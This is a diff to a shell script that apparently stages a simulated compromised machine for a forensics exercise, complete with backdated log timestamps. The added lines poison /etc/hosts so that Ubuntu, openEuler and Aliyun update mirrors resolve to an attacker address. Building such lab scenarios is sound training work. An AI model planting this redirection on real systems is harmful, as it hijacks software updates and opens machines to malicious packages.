@@ -6,6 +6,11 @@ set +e
 ATTACKER=198.51.100.7
 mkdir -p /var/log/nginx 2>/dev/null
 
+# Docker rewrites these two when the container starts, so the hijack is planted
+# here rather than in the image.
+printf '%s security.ubuntu.com\n%s updates.openeuler.org\n%s mirrors.aliyun.com\n' \
+  "$ATTACKER" "$ATTACKER" "$ATTACKER" >> /etc/hosts 2>/dev/null
+
 now() { date -d "-$1 minutes" '+%b %e %H:%M:%S' 2>/dev/null || date '+%b %e %H:%M:%S'; }
 web_now() { date -d "-$1 minutes" '+%d/%b/%Y:%H:%M:%S %z' 2>/dev/null || date '+%d/%b/%Y:%H:%M:%S %z'; }
 
